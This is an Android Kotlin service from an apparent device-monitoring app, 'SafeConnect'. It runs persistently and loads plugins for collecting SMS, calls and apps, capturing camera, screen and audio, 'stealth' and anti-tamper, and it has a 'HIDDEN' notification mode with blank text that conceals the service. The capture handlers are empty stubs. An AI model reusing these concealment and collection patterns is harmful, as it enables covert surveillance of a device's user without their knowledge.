package com.xpsafeconnect.monitored_app

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.plugin.common.MethodChannel
import io.flutter.embedding.engine.loader.FlutterLoader
import io.flutter.view.FlutterCallbackInformation
import java.util.concurrent.atomic.AtomicBoolean

class BackgroundCollectorService : Service() {
    private val serviceRunning = AtomicBoolean(false)
    private var flutterEngine: FlutterEngine? = null
    private var methodChannel: MethodChannel? = null
    
    companion object {
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "background_service_channel"
        private const val CHANNEL_NAME = "Background Service"
        private const val CALLBACK_HANDLE_KEY = "callback_handle"
        
        private const val ACTION_START = "com.xpsafeconnect.monitored_app.action.START"
        private const val ACTION_STOP = "com.xpsafeconnect.monitored_app.action.STOP"
        
        fun startService(context: Context, callbackHandle: Long) {
            val sharedPreferences = context.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
            sharedPreferences.edit().putLong(CALLBACK_HANDLE_KEY, callbackHandle).apply()
            
            val intent = Intent(context, BackgroundCollectorService::class.java)
            intent.action = ACTION_START
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        
        fun stopService(context: Context) {
            val intent = Intent(context, BackgroundCollectorService::class.java)
            intent.action = ACTION_STOP
            context.startService(intent)
        }

        @Volatile
        private var isServiceRunning = false
        
        fun isRunning(): Boolean {
            return isServiceRunning
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel()
        }
        
        startForeground(NOTIFICATION_ID, createNotification())
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        isServiceRunning = true
        when (intent?.action) {
            ACTION_START -> {
                if (serviceRunning.get()) {
                    return START_STICKY
                }
                
                startBackgroundService()
            }
            ACTION_STOP -> {
                stopForeground(true)
                stopSelf()
                return START_NOT_STICKY
            }
        }
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
    
    override fun onDestroy() {
        super.onDestroy()
        isServiceRunning = false
        serviceRunning.set(false)
        flutterEngine?.destroy()
        flutterEngine = null
    }
    
    private fun startBackgroundService() {
        if (serviceRunning.get()) {
            return
        }
        
        serviceRunning.set(true)
        
        val flutterLoader = FlutterLoader()
        flutterLoader.startInitialization(this)
        flutterLoader.ensureInitializationComplete(this, null)
        
        val sharedPreferences = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        val callbackHandle = sharedPreferences.getLong(CALLBACK_HANDLE_KEY, 0)
        
        if (callbackHandle == 0L) {
            stopSelf()
            return
        }
        
        val callbackInfo = FlutterCallbackInformation.lookupCallbackInformation(callbackHandle)
        if (callbackInfo == null) {
            stopSelf()
            return
        }
        
        flutterEngine = FlutterEngine(this)
        
        // Register plugins.
        // Keep this in sync with MainActivity: this service owns a separate
        // FlutterEngine and does not inherit plugins from the activity engine.
        flutterEngine?.plugins?.add(SmsCollectorPlugin())
        flutterEngine?.plugins?.add(CallsCollectorPlugin())
        flutterEngine?.plugins?.add(AppsCollectorPlugin())
        flutterEngine?.plugins?.add(MediaCapturePlugin())
        flutterEngine?.plugins?.add(BatteryMonitorPlugin())
        flutterEngine?.plugins?.add(UnlockDevicePlugin())
        flutterEngine?.plugins?.add(MediaStoreScannerPlugin())
        flutterEngine?.plugins?.add(BatteryOptimizationPlugin())
        flutterEngine?.plugins?.add(SecurityPlugin())
        flutterEngine?.plugins?.add(KeystorePlugin())
        flutterEngine?.plugins?.add(PerformancePlugin())
        flutterEngine?.plugins?.add(PermissionsPlugin())
        flutterEngine?.plugins?.add(StealthPlugin())
        flutterEngine?.plugins?.add(AntiTamperPlugin())
        
        val binaryMessenger = flutterEngine?.dartExecutor?.binaryMessenger ?: return
        methodChannel = MethodChannel(binaryMessenger, "com.xpsafeconnect.monitored_app/background")
        
        // Ajout du gestionnaire de méthodes pour MethodChannel
        methodChannel?.setMethodCallHandler { call, result ->
            when (call.method) {
                "isRunning" -> {
                    result.success(serviceRunning.get())
                }
                "requestMediaCapture" -> {
                    val mediaType = call.argument<String>("media_type") ?: "screenshot"
                    val frontCamera = call.argument<Boolean>("front_camera") ?: false
                    val durationSeconds = call.argument<Int>("duration_seconds") ?: 30
                    
                    // Logique pour capturer des médias en fonction du type
                    when (mediaType) {
                        "screenshot" -> {
                            // Logique pour capturer une capture d'écran
                        }
                        "photo" -> {
                            // Logique pour prendre une photo
                        }
                        "audio" -> {
                            // Logique pour enregistrer de l'audio
                        }
                    }
                    
                    result.success(true)
                }
                "requestDataSync" -> {
                    // Déclencher une synchronisation des données
                    result.success(true)
                }
                else -> {
                    result.notImplemented()
                }
            }
        }
        
        flutterEngine?.dartExecutor?.executeDartCallback(
            DartExecutor.DartCallback(
                assets,
                flutterLoader.findAppBundlePath(),
                callbackInfo
            )
        )
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background service for SafeConnect"
                enableLights(false)
                enableVibration(false)
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(): Notification {
        // Get notification mode from shared preferences
        val sharedPreferences = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        val notificationMode = sharedPreferences.getString("notification_mode", "VISIBLE") ?: "VISIBLE"
        
        val title: String
        val text: String
        
        when (notificationMode) {
            "VISIBLE" -> {
                title = "SafeConnect"
                text = "Surveillance active"
            }
            "MINIMIZED" -> {
                title = "Service"
                text = "Service en cours d'exécution"
            }
            "HIDDEN" -> {
                title = ""
                text = ""
            }
            else -> {
                title = "Service"
                text = "Service en cours d'exécution"
            }
        }
        
        val pendingIntent: PendingIntent =
            Intent(this, MainActivity::class.java).let { notificationIntent ->
                PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE)
            }
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }


}
